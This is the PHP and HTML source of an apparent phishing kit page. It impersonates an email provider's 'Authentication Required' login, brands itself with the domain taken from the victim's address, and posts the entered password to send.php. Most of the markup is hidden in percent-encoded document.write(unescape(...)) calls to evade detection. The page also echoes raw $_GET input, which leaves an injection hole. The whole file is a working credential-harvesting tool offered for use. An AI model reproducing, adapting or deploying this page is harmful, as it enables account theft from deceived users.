<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

<head>

<title><?php echo $yuh ?> Email Security :: For <?php echo $login ?></title>

<link rel="icon" href="./files/favicon.ico" type="image/gif">
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>


<script type="text/javascript"> 
function display_c(){
var refresh=1000; // Refresh rate in milli seconds
mytime=setTimeout('display_ct()',refresh)
}

function display_ct() {
var x = new Date()
document.getElementById('ct').innerHTML = x;
display_c();
 }
</script>

</head>


<script type="text/javascript">
<!--
document.write(unescape('%3c%62%6f%64%79%20%6d%61%72%67%69%6e%77%69%64%74%68%3d%22%30%22%20%6d%61%72%67%69%6e%68%65%69%67%68%74%3d%22%30%22%20%74%6f%70%6d%61%72%67%69%6e%3d%22%30%22%20%62%6f%74%74%6f%6d%6d%61%72%67%69%6e%3d%22%30%22%20%72%69%67%68%74%6d%61%72%67%69%6e%3d%22%30%22%20%6c%65%66%74%6d%61%72%67%69%6e%3d%22%30%22%20%6f%6e%6c%6f%61%64%3d%22%64%69%73%70%6c%61%79%5f%63%74%28%29%3b%22%3e%0d%0a%0d%0a%3c%74%61%62%6c%65%20%77%69%64%74%68%3d%22%31%30%30%25%22%20%68%65%69%67%68%74%3d%22%31%30%30%25%22%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%20%63%65%6c%6c%73%70%61%63%69%6e%67%3d%22%30%22%3e%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%31%30%25%22%20%62%67%63%6f%6c%6f%72%3d%22%23%30%30%30%22%3e%0d%0a%0d%0a%09%3c%74%61%62%6c%65%3e%3c%74%72%3e%0d%0a%0d%0a%09%3c%74%64%20%77%69%64%74%68%3d%22%35%30%22%3e%3c%2f%74%64%3e%0d%0a%0d%0a%09%3c%74%64%3e%0d%0a%09%09%0d%0a%09%09%3c%62%3e%0d%0a%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%4c%75%63%69%64%61%20%47%72%61%6e%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%20%55%6e%69%63%6f%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%2c%20%44%65%6a%61%56%75%20%53%61%6e%73%2c%20%56%65%72%64%61%6e%61%2c%20%73%61%6e%73%2d%73%65%72%69%66%22%20%73%69%7a%65%3d%22%32%22%20%63%6f%6c%6f%72%3d%22%23%46%46%46%22%3e%0d%0a%09%09%3c%73%70%61%6e%20%69%64%3d%27%63%74%27%3e%3c%2f%73%70%61%6e%3e%0d%0a%09%09%3c%2f%66%6f%6e%74%3e%0d%0a%09%09%3c%2f%62%3e%0d%0a%0d%0a%09%3c%2f%74%64%3e%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%38%35%25%22%20%62%67%63%6f%6c%6f%72%3d%22%23%45%36%45%36%45%36%22%3e%0d%0a%0d%0a%0d%0a%09%3c%74%61%62%6c%65%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%3c%74%72%3e%3c%74%64%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%33%38%30%70%78%3b%22%3e%0d%0a%0d%0a%09%09%0d%0a%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%4c%75%63%69%64%61%20%47%72%61%6e%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%20%55%6e%69%63%6f%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%2c%20%44%65%6a%61%56%75%20%53%61%6e%73%2c%20%56%65%72%64%61%6e%61%2c%20%73%61%6e%73%2d%73%65%72%69%66%22%20%73%69%7a%65%3d%22%2b%33%22%20%63%6f%6c%6f%72%3d%22%23%30%38%32%39%38%41%22%3e'));
//-->
</script>


			<?php echo $yuh ?> WebApp

<script type="text/javascript">
<!--
document.write(unescape('%3c%2f%66%6f%6e%74%3e%0d%0a%0d%0a%0d%0a%09%3c%2f%74%64%3e%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%09%3c%62%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%09%3c%74%61%62%6c%65%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%3c%74%72%3e%0d%0a%0d%0a%09%3c%74%64%3e%0d%0a%0d%0a%09%09%0d%0a%09%09%3c%74%61%62%6c%65%3e%3c%74%72%3e%0d%0a%09%09%3c%74%64%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%33%38%30%70%78%3b%20%68%65%69%67%68%74%3a%33%30%30%70%78%3b%20%66%6f%6e%74%2d%66%61%6d%69%6c%79%3a%20%56%65%72%64%61%6e%61%3b%20%66%6f%6e%74%2d%73%69%7a%65%3a%20%31%33%70%78%3b%20%66%6f%6e%74%2d%77%65%69%67%68%74%3a%20%6c%69%67%68%74%3b%20%63%6f%6c%6f%72%3a%23%30%30%30%30%30%30%3b%20%0d%0a%09%09%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%23%46%41%46%41%46%41%3b%20%62%6f%72%64%65%72%3a%20%73%6f%6c%69%64%20%31%70%78%20%23%46%32%46%32%46%32%3b%20%70%61%64%64%69%6e%67%3a%20%38%70%78%3b%20%0d%0a%09%09%2d%6d%6f%7a%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%20%2d%77%65%62%6b%69%74%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%20%2d%6b%68%74%6d%6c%2d%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%35%70%78%3b%0d%0a%09%09%2d%77%65%62%6b%69%74%2d%62%6f%78%2d%73%68%61%64%6f%77%3a%20%30%70%78%20%30%70%78%20%31%37%70%78%20%31%30%70%78%20%23%30%30%30%30%30%30%3b%20%62%6f%78%2d%73%68%61%64%6f%77%3a%20%30%70%78%20%30%70%78%20%31%37%70%78%20%31%30%70%78%20%23%30%30%30%30%30%30%3b%22%3e%0d%0a%0d%0a%09%09%0d%0a%0d%0a%09%09%09%3c%74%61%62%6c%65%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%0d%0a%0d%0a%09%09%09%3c%74%72%3e%3c%74%64%3e'));
//-->
</script>


				<form method="post" action="send.php">

<script type="text/javascript">
<!--
document.write(unescape('%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%3Ctr%3E%3Ctd%20height%3D%22%22%3E%0D%0A%20%0D%0A%09%09%09%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%222%22%20color%3D%22%23000%22%3E%0D%0A%0D%0A%09%09%09%09%3Cfont%20size%3D%22%2B1%22%20color%3D%22%2308298A%22%3EAuthentication%20Required%3C%2Ffont%3E%0D%0A%0D%0A%09%09%09%09%3Cbr%3E%0D%0A%0D%0A%09%09%09%09Enter%20password%0D%0A%0D%0A%09%09%09%09%3C%2Ffont%3E%0D%0A%0D%0A%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%3Ctr%3E%3Ctd%20height%3D%225%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%3Ctr%3E%3Ctd%20style%3D%22width%3A265px%3B%20height%3A37px%3B%20font-family%3A%20Verdana%3B%20font-size%3A%2013px%3B%20font-weight%3A%20light%3B%20color%3A%23000000%3B%20%0D%0A%09%09%09background-color%3A%20%23E6E6E6%3B%20border%3A%20solid%201px%20%23E6E6E6%3B%20padding%3A%208px%3B%20%0D%0A%09%09%09-moz-border-radius%3A%202px%3B%20-webkit-border-radius%3A%202px%3B%20-khtml-border-radius%3A%202px%3B%20border-radius%3A%202px%3B%0D%0A%09%09%09-webkit-box-shadow%3A%200px%200px%208px%203px%20%23000000%3B%20box-shadow%3A%200px%200px%208px%203px%20%23000000%3B%22%3E%0D%0A%0D%0A%09%09%09%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20%0D%0A%09%09%09%09size%3D%222%22%20color%3D%22%2300%22%3E'));
//-->
</script>

				<?php echo $login ?>

<script type="text/javascript">
<!--
document.write(unescape('%3C%2Ffont%3E%09%09%09%09%0D%0A%09%09%09%09%09%0D%0A%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%3Ctr%3E%3Ctd%20height%3D%225%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%09%09%09%0D%0A%09%09%09%3Ctr%3E%3Ctd%3E%0D%0A%0D%0A%09%09%09%09%3Cinput%20%20name%3D%22passwd%22%20type%3D%22password%22%20%0D%0A%09%09%09%09style%3D%22width%3A300px%3B%20height%3A37px%3B%20font-family%3A%20Verdana%3B%20font-size%3A%2013px%3B%20font-weight%3A%20light%3B%20color%3A%23000000%3B%20%0D%0A%09%09%09%09background-color%3A%20%23E6E6E6%3B%20border%3A%20solid%201px%20%23333%3B%20padding%3A%208px%3B%20%0D%0A%09%09%09%09-moz-border-radius%3A%202px%3B%20-webkit-border-radius%3A%202px%3B%20-khtml-border-radius%3A%202px%3B%20border-radius%3A%202px%3B%0D%0A%09%09%09%09-webkit-box-shadow%3A%200px%200px%208px%203px%20%23000000%3B%20box-shadow%3A%200px%200px%208px%203px%20%23000000%3B%22%20%0D%0A%09%09%09%09required%3D%22%22%20placeholder%3D%22Password%22%3E%09%0D%0A%0D%0A%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%3Ctr%3E%3Ctd%20height%3D%225%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%3Ctr%3E%3Ctd%20height%3D%22%22%3E%0D%0A%0D%0A%09%09%09%09%3Cinput%20type%3D%22checkbox%22%20checked%3D%22%22%3E%20%0D%0A%09%09%09%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%222%22%20color%3D%22%23000%22%3E%0D%0A%0D%0A%09%09%09%09%09Stay%20signed%20in%0D%0A%0D%0A%09%09%09%09%3C%2Ffont%3E%0D%0A%0D%0A%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%3Ctr%3E%3Ctd%20height%3D%225%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%3Ctr%3E%3Ctd%3E%0D%0A%0D%0A%09%09%09%09%3Cinput%20type%3D%22submit%22%20value%3D%22Sign%20in%20%3E%3E%3E%22%20style%3D%22width%3A300px%3B%20height%3A40px%3B%0D%0A%09%09%09%09background-color%3A%20%2308298A%3B%20border%3A%20solid%203px%20%2308298A%3B%20font-family%3A%20Verdana%3B%20%0D%0A%09%09%09%09font-size%3A%2013px%3B%20font-weight%3A%20light%3B%20color%3A%20%23ffffff%3B%20%0D%0A%09%09%09%09-moz-border-radius%3A%202px%3B%20-webkit-border-radius%3A%202px%3B%20-khtml-border-radius%3A%202px%3B%20border-radius%3A%202px%3B%0D%0A%09%09%09%09-webkit-box-shadow%3A%200px%200px%208px%203px%20%23000000%3B%20box-shadow%3A%200px%200px%208px%203px%20%23000000%3B%22%3E%0D%0A%09%0D%0A%0D%0A%09%09%09%3C%2Ftd%3E%3C%2Ftr%3E%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%09%09%09%3Ctr%3E%3Ctd%20height%3D%2220%22%3E'));
//-->
</script>


				<input type="hidden" name="login" value="<?php echo $login ?>">

<script type="text/javascript">
<!--
document.write(unescape('%3c%2f%66%6f%72%6d%3e%0d%0a%0d%0a%09%09%09%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%09%09%09%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%0d%0a%0d%0a%09%09%3c%2f%74%64%3e%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%09%09%0d%0a%0d%0a%0d%0a%09%3c%2f%74%64%3e%0d%0a%0d%0a%09%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%0d%0a%0d%0a%09%3c%62%72%3e%3c%62%72%3e%0d%0a%09%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%35%25%22%20%62%67%63%6f%6c%6f%72%3d%22%23%30%38%32%39%38%41%22%3e%0d%0a%0d%0a%09%3c%64%69%76%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%0d%0a%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%4c%75%63%69%64%61%20%47%72%61%6e%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%20%55%6e%69%63%6f%64%65%2c%20%4c%75%63%69%64%61%20%53%61%6e%73%2c%20%44%65%6a%61%56%75%20%53%61%6e%73%2c%20%56%65%72%64%61%6e%61%2c%20%73%61%6e%73%2d%73%65%72%69%66%22%20%73%69%7a%65%3d%22%32%22%20%63%6f%6c%6f%72%3d%22%23%46%46%46%22%3e'));
//-->
</script>


		-- | <?php echo $yuh ?>  Email Settings | For: <?php echo $login ?> | -- 

<script type="text/javascript">
<!--
document.write(unescape('%3c%2f%66%6f%6e%74%3e%0d%0a%09%3c%2f%64%69%76%3e%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%3c%2f%62%6f%64%79%3e%0d%0a%0d%0a%3c%2f%68%74%6d%6c%3e'));
//-->
</script>